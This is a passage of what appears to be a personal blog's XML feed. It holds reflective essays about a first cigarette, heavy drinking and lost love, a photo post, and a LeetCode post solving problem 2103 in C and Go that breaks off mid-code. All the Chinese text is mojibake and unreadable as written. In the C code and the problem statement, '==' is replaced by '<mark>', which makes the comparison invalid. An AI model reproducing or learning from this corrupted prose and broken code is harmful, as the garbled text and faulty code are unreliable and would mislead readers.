        <content type="html"><![CDATA[<p>é‚£æ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœŸæ­£æ„ä¹‰ä¸Šçš„å¸çƒŸã€‚ä¹‹å‰æŠ½è¿‡å¾ˆå¤šçƒŸï¼Œå„ç§å„æ ·çš„ï¼Œä½†éƒ½æ²¡èƒ½çœŸæ­£çš„å¸è¿›å»ï¼ŒçƒŸå¸åˆ°å£è…”é‡Œï¼Œåè¿›å»ï¼Œæˆ–è€…ç›´æ¥åå‡ºæ¥ï¼Œå¹¶æ²¡æœ‰çœŸæ­£è¿‡è‚ºã€‚å¯å½“æˆ‘ç¬¬ä¸€æ¬¡æŠŠçƒŸå¸è¿›è‚ºé‡Œï¼Œå°¼å¤ä¸ç©¿è¿‡ç»†èƒè¿›å…¥è¡€æ¶²ï¼Œæµæ·Œè‡³å…¨èº«ã€‚è¯¥æ€ä¹ˆå½¢å®¹é‚£ç§æ„Ÿè§‰å‘¢ï¼Œæˆ‘ç¼©åœ¨çª—å‰ï¼Œæ•´ä¸ªäººé¢¤æŠ–ç€ï¼Œä¸çŸ¥é“æ˜¯å› ä¸ºå†·è¿˜æ˜¯å› ä¸ºå…´å¥‹ï¼Œä¸€è¾¹å®³æ€•ä¸€è¾¹å¤§å£çš„å¸ç€ï¼Œåˆšå¼€å§‹çš„ä¸¤å£æœ‰ç‚¹å‘›äººï¼Œæœ‰ç‚¹è‹¦æ¶©ï¼Œå¤šå¸ä¸¤å£ä¹‹åï¼Œç™¾ä¹çš„çº¢é…’å‘³ä»è‚ºé‡Œæ•£å¼€ï¼Œç”šè‡³å¿˜äº†æŠ–åŠ¨çƒŸç°ï¼Œæˆ‘çœ‹ç€æœ‰ç‚¹åƒå¤•é˜³çš„ç«å…‰ï¼Œå’Œå·²ç»å†·æ‰çš„çƒŸå¤´ï¼Œæƒ³èµ·äº†è¿˜æ²¡åšçš„è…¾è®¯ç¬”è¯•ï¼Œæƒ³èµ·äº†æ›¾ç»åœ¨é…’å§é‡Œçš„é†‰ç”Ÿæ¢¦æ­»ã€‚æˆ‘çœŸçš„æœ‰ç‚¹ä¸æ˜ç™½äº†ã€‚</p><p>åŸæ¥è¿™å°±æ˜¯å°¼å¤ä¸çš„å¨åŠ›ï¼Œæ›¾ç»çœ‹è¿‡æ•™ç§‘ä¹¦é‡Œæ—§æ—¶ä»£äººä»¬å¸é£Ÿé¸¦ç‰‡çš„ç…§ç‰‡ï¼Œæˆ‘çªç„¶æ„Ÿè§‰ä½“ä¼šåˆ°äº†é‚£ç§å‰æ‰€æœªæœ‰çš„å¿«æ„Ÿï¼Œè¿™è®©æˆ‘ææƒ§ï¼Œè™½ç„¶æˆ‘åªæ˜¯æƒ³è¦æ¸…é†’ï¼Œä½†æˆ‘é¢¤æŠ–ç€åŒæ‰‹ï¼Œæ“¦ç€æ‰è½åœ¨å®¶é‡Œå¹²å‡€çš„åœ°æ¿ä¸Šçš„çƒŸç°ï¼Œé¢¤æŠ–ç€åŒæ‰‹ï¼Œå†²è¿›å«ç”Ÿé—´ï¼Œç–¯ç‹‚æ¼±å£ï¼Œç–¯ç‹‚åˆ·ç‰™ï¼Œç„¶åå°å¿ƒç¿¼ç¿¼çš„è—èµ·ä½œæ¡ˆå·¥å…·ã€‚å¤§å£çš„æ·±å‘¼å¸ï¼Œå¤§å£çš„æ å¤ºç©ºæ°”ä¸­çš„äºŒæ°§åŒ–ç¢³ã€‚</p><p>æˆ‘ä¸çŸ¥é“è¿™æ˜¯æ€ä¹ˆäº†ï¼Œè¿™åˆ°åº•æ˜¯æ˜¯æ€ä¹ˆäº†ã€‚æ¸…é†’å’Œé†‰éƒ½æ˜¯æˆ‘æƒ³è¦çš„ï¼Œéƒ½ä¸æ˜¯æˆ‘æƒ³è¦çš„ï¼Œæˆ‘åªæƒ³ç”Ÿæ´»çš„å¼ºçƒˆä¸€äº›ï¼Œæ²¡æœ‰çˆ±æƒ…å°±ç”¨è¯ç‰©æˆ–è€…åˆ«çš„ä»€ä¹ˆå¡«æ»¡ç©ºè™šï¼Œæ‰‹ä¸Šçš„çƒŸå‘³æ€ä¹ˆä¹Ÿæ´—ä¸æ‰ï¼Œæˆ‘è®¨åŒå¹³åº¸ï¼Œè®¨åŒè‡ªå·±ã€‚èº«ä½“å’Œçµé­‚å¥½åƒéƒ½äº¤å‡ºå»äº†ã€‚</p><p>å°çŒ«å’ªçœ¼ä¸­æœ‰çˆ±æƒ…å—ï¼Œåœ¨çˆ±ä¸Šä¸€åªçŒ«ä¹‹åè¢«ä¸»äººæŠ“å»è¢«è¿«å’Œå¦ä¸€åªä¸è®¤è¯†çš„çŒ«äº¤é…ï¼Œä¸äº¤é…å°±ä¼šå‘æƒ…ï¼Œå°±ä¼šç—›è‹¦ï¼Œå°±ä¼šæƒ¹ä¸»äººç”Ÿæ°”ã€‚å¯æ˜¯ä¸‡ä¸€å¥¹å·²ç»çˆ±ä¸Šå…¶ä»–çš„çŒ«äº†å‘¢ã€‚æˆ‘å¥½åƒåˆå¬åˆ°äº†åšå«çš„å£°éŸ³ï¼Œæ˜¯å‘æƒ…ï¼Œè¿˜æ˜¯ç—›è‹¦å‘¢ã€‚</p><p>æ²¡æœ‰äººåœ¨æ„å°±è¿å¥¹è‡ªå·±ï¼Œä¹Ÿä¸è¿‡æ˜¯å—ç€èº«æ¬²æœ›çš„æ”¯é…ã€‚</p><p>é‚£ä¹ˆï¼Œé‚£ä¹ˆä½ åˆæ€ä¹ˆèƒ½è¯´çˆ±æƒ…æ˜¯è‡³é«˜æ— ä¸Šçš„å‘¢ã€‚ä½ åˆæ€ä¹ˆèƒ½è§‰å¾—çˆ±æƒ…æ˜¯ä¸€å®šå­˜åœ¨äºè¿™ä¸ªä¸–ç•Œä¸Šçš„ã€‚æˆ‘æ€»æ˜¯è§‰å¾—æˆ‘æ›¾ç»çˆ±è¿‡çš„äººï¼Œéƒ½ä¸ä¼šçœŸæ­£çš„çˆ±ä¸Šä¸€ä¸ªäººï¼Œå¯æ˜¯æˆ‘å‘¢ï¼Œæˆ‘åˆçœŸçš„èƒ½çœŸæ­£çˆ±ä¸ŠæŸä¸ªäººå—ã€‚æ›¾ç»ä¸ç›¸ä¿¡çˆ±æƒ…ï¼Œä½†æ˜¯åšä¿¡è‡ªå·±ä¼šé‡è§å¯¹çš„äººï¼Œç°åœ¨å‘ç°å¤§å®¶å¥½åƒéƒ½æ²¡é‡è§ï¼Œæˆ‘åˆå‡­ä»€ä¹ˆé‡è§ã€‚å¯æˆ‘æƒ³èµ·é‚£äº›çœ¼ç¥çš„é—ªèº²ï¼Œé‚£äº›å°å¿ƒç¿¼ç¿¼çš„æ°”æ¯ï¼Œè¿˜æœ‰çªç„¶æœ‰äº†æ„ä¹‰çš„æ–‡å­—ã€‚ä¸å¯å¦è®¤çš„æ˜¯æˆ‘ç¡®å®æ›¾ç»å†è¿‡ä¸€äº›éš¾å¿˜çš„äº‹æƒ…ï¼Œä½†é‚£å¯¹ç°åœ¨çš„æˆ‘æ¥è¯´éƒ½å¤ªé¥è¿œäº†ï¼Œæˆ‘å¼€å§‹å˜äº†ã€‚ä»å–é…’çš„æ—¶å€™å¼€å§‹ï¼Œä»æŠ½çƒŸçš„æ—¶å€™å¼€å§‹ï¼Œæˆ‘å˜å¾—å¥½é™Œç”Ÿï¼Œæˆ‘å¼€å§‹å˜æˆæ›¾ç»å–œæ¬¢çš„äººçš„æ¨¡æ ·ã€‚æˆ‘æƒ³åˆ°äº†ä»–çš„çœ¼ç¥ï¼Œä¹Ÿè®¸æˆ‘ä¸€è¾ˆå­éƒ½çœ‹ä¸é€ï¼Œç»“æœæˆ‘è¿è‡ªå·±ä¹Ÿçœ‹ä¸é€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å—äº¬</title>
      <link href="/2023/12/10/%E5%8D%97%E4%BA%AC/"/>
      <url>/2023/12/10/%E5%8D%97%E4%BA%AC/</url>
      
        <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/A304CC59851A2F9DA2FB3DE59E4B6ED6.jpg" alt="A304CC59851A2F9DA2FB3DE59E4B6ED6" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/DBCA5E664154D7B6600819F0137C6CF2.jpg" alt="DBCA5E664154D7B6600819F0137C6CF2" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/04FCDA3D1EA20E80DA3E70B40004A70C.jpg" alt="04FCDA3D1EA20E80DA3E70B40004A70C" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/40E7979BC36D79DC6B8BCC51378C1073.jpg" alt="40E7979BC36D79DC6B8BCC51378C1073" style="zoom:33%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> æ‘„å½± </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‘„å½± </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿™æ˜¯æˆ‘ç¦»æµ·æœ€è¿‘çš„ä¸€æ¬¡</title>
      <link href="/2023/12/09/%E8%BF%99%E6%98%AF%E6%88%91%E7%A6%BB%E6%B5%B7%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E6%AC%A1/"/>
      <url>/2023/12/09/%E8%BF%99%E6%98%AF%E6%88%91%E7%A6%BB%E6%B5%B7%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E6%AC%A1/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ˜¯æˆ‘ç¦»æµ·æœ€è¿‘çš„ä¸€æ¬¡ã€‚</p><p>é•¿è¿™ä¹ˆå¤§è§è¿‡çš„æœ€å¤§çš„ä¸œè¥¿æ˜¯å¤©ç©ºã€‚æµ·ä¹Ÿæ˜¯è¿™æ ·çš„å—ï¼Œæœ‰å¤šå¤§å‘¢ï¼Œæ—¥è½çš„æ—¶å€™ä¼šæ˜¯æ©˜å­ä¸€æ ·çš„é¢œè‰²å—ã€‚å¥½æµªæ¼«å•Šï¼Œä»–å¯¹æˆ‘è¯´æµªæ¼«çš„æ—¶å€™æˆ‘åªè§‰å¾—éš¾å—ï¼Œå¯æµªæ¼«æœ¬æ¥åº”è¯¥æ˜¯æµªæ¼«çš„ã€‚å“ªé‡Œçš„èŠ±åº—éƒ½è´©å–å¹¸ç¦ã€‚</p><p>æˆ‘æƒ³èµ·äº†å°¼é‡‡ï¼Œæƒ³åˆ°é…’ç¥å·´åº“æ–¯ï¼Œæˆ‘å·²ç»å¿˜è®°ä»–å¥½ä¹…äº†å¯æˆ‘æ˜¨æ™šçªç„¶æƒ³èµ·æ¥ã€‚ç¬¬ä¸€æ¬¡å–é…’å–è¿›åŒ»é™¢çš„æ—¶å€™æˆ‘å‘ä»–é“åˆ«ï¼Œè‡³æ­¤æˆ‘è™½ç„¶åˆå†å–è¿‡å¾ˆå¤šé…’ï¼Œå´å†ä¹Ÿæ²¡è§è¿‡ä»–äº†ã€‚æˆ‘æ„Ÿåˆ°è‡ªå·±è¢«æŠ›å¼ƒï¼Œè¢«è¿‡å»çš„è‡ªå·±æŠ›å¼ƒã€‚æ—¥æ–¹ä¸­æ–¹ç¨ï¼Œç‰©æ–¹ç”Ÿæ–¹æ­»ã€‚å’Œé«˜ä¸­çš„åŒæ¡Œåœ¨ä¸€åƒå¤šå…¬é‡Œä»¥å¤–çš„é™Œç”Ÿè¡—é“ä¸Šè¯´ç€æ–¹è¨€ï¼Œè¯•å›¾å›åˆ°æ›¾ç»çš„æ¨¡æ ·ï¼Œä½†æˆ‘çœ‹è§å¤©ç©ºä¸­å¸ƒæ»¡è€€çœ¼çš„çº¢è‰²çš„å±‚ç§¯äº‘ï¼Œè€Œæˆéƒ½çš„æ—¥è½å‘¢ï¼Œæ˜¯è¦æ›´åŠ æš–ä¸€ç‚¹çš„æ©™é»„è‰²ã€‚</p><p>â€œç‰©ç†ç«èµ›â€è¿™ä¸ªå¥½åƒå·²ç»å¾ˆå¤è€çš„è¯ä»ä»–å˜´é‡Œè¯´å‡ºæ¥ã€‚ç‰©ç†ï¼Œæˆ‘åˆæ€ä¹ˆèƒ½æƒ³åˆ°æ›¾ç»çˆ±çš„è¦æ­»çš„ä¸œè¥¿å¦‚ä»Šå·²ç»å®Œå…¨ä»æˆ‘çš„ç”Ÿæ´»ç¦»å¼€äº†ã€‚</p><p>æƒ³æŠŠæˆ‘çš„äºŒåå²è¿˜ç»™æˆ‘è‡ªå·±ï¼Œå¯æˆ‘çœŸçš„èƒ½è¿˜ç»™æˆ‘å—ï¼Œçƒ‚é†‰çš„æ—¶å€™æˆ‘ä»¥ä¸ºæˆ‘çŸ­æš‚çš„é€ƒç¦»äº†ä¸–ç•Œï¼Œä½†æˆ‘çš„çµé­‚ï¼Œå¥½åƒå·²ç»å½»åº•çƒ‚é€äº†ï¼Œä¸çŸ¥é“ä»å“ªé‡Œå¼€å§‹ä¿®ç†ï¼Œä¹Ÿæ²¡æœ‰å‹‡æ°”ã€‚çœ‹åˆ°é‚£ä¸ªäººçš„åšå®¢ï¼Œæˆ‘æ„Ÿè§‰æœ‰ç‚¹å®³æ€•ã€‚æˆ‘çœŸæ­£éœ€è¦çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Œå¥½åƒå¿˜è®°äº†ã€‚</p><p>é™¤äº†è‡ªå·±æ²¡æœ‰äººèƒ½æ‰“è´¥æˆ‘ï¼Œå¯æ˜¯äººå¤©ç”Ÿå°±å­¦ä¼šäº†ç«äº‰ï¼Œè¿™ä¸èƒ½ç§°ä¹‹ä¸ºé”™ï¼Œä½†æˆ‘ä¸çŸ¥é“è¿˜æœ‰ä»€ä¹ˆæ˜¯å¯¹ï¼Œæˆ‘å–œæ¬¢æ—¥å‡ºï¼Œæ›´å–œæ¬¢æ—¥è½ï¼Œçƒ­è¡·äºå¤œæ™šï¼Œä¹Ÿå¹»æƒ³ç€æ©˜å­è‰²çš„å¤§æµ·ã€‚</p><p>æ›¾ç»å–œæ¬¢çš„äººå¤§å¤šåœ¨å†¬æ—¥å‡ºç”Ÿï¼Œæˆ‘ä¹Ÿæ˜¯ã€‚æ‰€ä»¥æˆ‘ä¹Ÿæœ€å–œæ¬¢å†¬å¤©çš„å¤ªé˜³ï¼Œå†·å†·çš„ï¼Œä½†æ˜¯è¶³å¤Ÿè€€çœ¼ã€‚å¤ªçƒ­ä¼šç¼ä¼¤æˆ‘ï¼Œå¤ªå†·ä¼šè®©æˆ‘è§‰å¾—æ— è¶£ã€‚å†·å†·çš„çƒ­çƒˆï¼Œæ‰æ˜¯æ°åˆ°å¥½å¤„çš„æš§æ˜§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCodeæ¯æ—¥ä¸€é¢˜_2023_11</title>
      <link href="/2023/12/04/LeetCode%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-2023-11/"/>
      <url>/2023/12/04/LeetCode%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-2023-11/</url>
      
        <content type="html"><![CDATA[<h4 id="DAY1-2103-ç¯å’Œæ†"><a href="#DAY1-2103-ç¯å’Œæ†" class="headerlink" title="DAY1-2103.ç¯å’Œæ†"></a>DAY1-2103.ç¯å’Œæ†</h4><p><a href="https://leetcode.cn/problems/rings-and-rods/">2103. ç¯å’Œæ†</a></p><h6 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h6><p><mark>ç®€å•<mark></p><blockquote><p>æ€»è®¡æœ‰ <code>n</code> ä¸ªç¯ï¼Œç¯çš„é¢œè‰²å¯ä»¥æ˜¯çº¢ã€ç»¿ã€è“ä¸­çš„ä¸€ç§ã€‚è¿™äº›ç¯åˆ†åˆ«ç©¿åœ¨ 10 æ ¹ç¼–å·ä¸º <code>0</code> åˆ° <code>9</code> çš„æ†ä¸Šã€‚</p><p>ç»™ä½ ä¸€ä¸ªé•¿åº¦ä¸º <code>2n</code> çš„å­—ç¬¦ä¸² <code>rings</code> ï¼Œè¡¨ç¤ºè¿™ <code>n</code> ä¸ªç¯åœ¨æ†ä¸Šçš„åˆ†å¸ƒã€‚<code>rings</code> ä¸­æ¯ä¸¤ä¸ªå­—ç¬¦å½¢æˆä¸€ä¸ª <strong>é¢œè‰²ä½ç½®å¯¹</strong> ï¼Œç”¨äºæè¿°æ¯ä¸ªç¯ï¼š</p><ul><li>ç¬¬ <code>i</code> å¯¹ä¸­çš„ <strong>ç¬¬ä¸€ä¸ª</strong> å­—ç¬¦è¡¨ç¤ºç¬¬ <code>i</code> ä¸ªç¯çš„ <strong>é¢œè‰²</strong>ï¼ˆ<code>&#39;R&#39;</code>ã€<code>&#39;G&#39;</code>ã€<code>&#39;B&#39;</code>ï¼‰ã€‚</li><li>ç¬¬ <code>i</code> å¯¹ä¸­çš„ <strong>ç¬¬äºŒä¸ª</strong> å­—ç¬¦è¡¨ç¤ºç¬¬ <code>i</code> ä¸ªç¯çš„ <strong>ä½ç½®</strong>ï¼Œä¹Ÿå°±æ˜¯ä½äºå“ªæ ¹æ†ä¸Šï¼ˆ<code>&#39;0&#39;</code> åˆ° <code>&#39;9&#39;</code>ï¼‰ã€‚</li></ul><p>ä¾‹å¦‚ï¼Œ<code>&quot;R3G2B1&quot;</code> è¡¨ç¤ºï¼šå…±æœ‰ <code>n &lt;mark&gt; 3</code> ä¸ªç¯ï¼Œçº¢è‰²çš„ç¯åœ¨ç¼–å·ä¸º 3 çš„æ†ä¸Šï¼Œç»¿è‰²çš„ç¯åœ¨ç¼–å·ä¸º 2 çš„æ†ä¸Šï¼Œè“è‰²çš„ç¯åœ¨ç¼–å·ä¸º 1 çš„æ†ä¸Šã€‚</p><p>æ‰¾å‡ºæ‰€æœ‰é›†é½ <strong>å…¨éƒ¨ä¸‰ç§é¢œè‰²</strong> ç¯çš„æ†ï¼Œå¹¶è¿”å›è¿™ç§æ†çš„æ•°é‡ã€‚</p></blockquote><h5 id="Cå®ç°"><a href="#Cå®ç°" class="headerlink" title="Cå®ç°"></a>Cå®ç°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> *rings)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> * rings)</span>&#123;</span><br><span class="line">    <span class="type">int</span> count[<span class="number">10</span>][<span class="number">3</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(rings); </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span> != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> a = rings[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> b = rings[i<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">switch</span> (b) &#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;R&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    b = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;G&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    b = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;B&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    b = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            count[a][b] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (count[i][<span class="number">0</span>] &gt; <span class="number">0</span> &amp;&amp; count[i][<span class="number">1</span>] &gt; <span class="number">0</span> &amp;&amp; count[i][<span class="number">2</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        x++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> rings[<span class="number">2</span>*N];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, rings);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, countPoints(rings));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼˜åŒ–ç‚¹ï¼šä½¿ç”¨<strong>çŠ¶æ€å‹ç¼©</strong>æ¥è¡¨ç¤ºä¸åŒçš„æ†</p><ul><li>å¦‚æœæœ‰Rï¼Œé‚£ä¹ˆ<code>|=0b001</code></li><li>ä¹Ÿå°±æ˜¯å¦‚æœæœ‰Rï¼Œä¸ªä½æ•°ä¸€å®šä¼šæ˜¯1</li><li>å¦‚æœæœ€åä¸‰ä½éƒ½æ˜¯1ï¼Œé‚£ä¹ˆæ»¡è¶³æ¡ä»¶</li></ul><h5 id="Cä¼˜åŒ–"><a href="#Cä¼˜åŒ–" class="headerlink" title="Cä¼˜åŒ–"></a>Cä¼˜åŒ–</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> *rings)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> rings[<span class="number">2</span>*N] = <span class="string">&quot;B1G1R1&quot;</span>;</span><br><span class="line">    <span class="comment">//scanf(&quot;%s&quot;, rings);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, countPoints(rings));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> * rings)</span>&#123;</span><br><span class="line">    <span class="type">int</span> count[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(rings); </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span> != <span class="number">0</span>)&#123;    <span class="comment">//æ†çš„ä½ç½®</span></span><br><span class="line">            <span class="type">int</span> a = rings[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> b = rings[i<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">switch</span> (b) &#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;R&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    count[a]  |= <span class="number">1</span>;   <span class="comment">//0b001   </span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;G&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    count[a]  |= <span class="number">2</span>;    <span class="comment">//0b010</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;B&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    count[a]  |= <span class="number">4</span>;    <span class="comment">//0b100</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (count[i] &lt;mark&gt; <span class="number">7</span>) &#123;</span><br><span class="line">        x++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="goå®ç°"><a href="#goå®ç°" class="headerlink" title="goå®ç°"></a>goå®ç°</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> N = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">countPoints</span><span class="params">(rings <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">count := [<span class="number">10</span>]<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">len</span> := <span class="built_in">len</span>(rings)</span><br><span class="line"><span 